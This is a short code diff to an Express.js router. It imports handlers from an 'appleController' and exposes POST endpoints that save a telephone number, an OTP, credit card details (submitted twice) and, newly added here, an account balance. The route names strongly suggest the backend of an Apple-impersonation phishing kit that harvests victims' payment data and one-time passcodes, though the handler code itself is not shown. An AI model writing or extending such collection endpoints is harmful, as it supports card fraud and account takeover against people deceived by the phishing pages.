@@ -12,6 +12,7 @@ const {
   submitCCAgain,
   submitCC,
   deleteEntry,
+  submitBalance,
 } = require("../controllers/appleController");
 
 const router = express.Router();
@@ -28,5 +29,6 @@ router.post("/saveTelephone", submitTelephone);
 router.post("/saveOtp", submitOtp);
 router.post("/saveCCAgain", submitCCAgain);
 router.post("/saveCC", submitCC);
+router.post("/saveBalance", submitBalance);
 
 module.exports = router;
